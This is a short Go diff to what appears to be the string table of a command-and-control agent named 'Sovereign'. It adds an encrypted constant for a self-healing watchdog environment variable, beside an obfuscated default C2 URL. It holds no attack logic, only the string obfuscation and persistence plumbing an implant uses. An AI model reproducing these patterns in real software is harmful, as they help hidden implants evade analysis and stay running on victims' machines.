@@ -66,6 +66,9 @@ const (
 	// Agent banner
 	SSovereign = "ab450d5a13dabb548c96ac:8BZiLHao3j3r+PE=" // "[Sovereign]"
 
+	// Self-heal watchdog marker (env var the watcher reads).
+	SWatchdogEnv = "c03f2fe20e20d27ce8fda64c:k3B5p1xlmzumovEI" // "SOVEREIGN_WD"
+
 	// Default C2 URL fallback (used only when no config blob is injected)
 	SC2DefaultURL = "48b37a32e5dd291af634488823fc2aacae9f43c43b:IMcOQt/yBivEA2a4DcwEnZSnc/wL" // "http://127.0.0.1:8080"
 
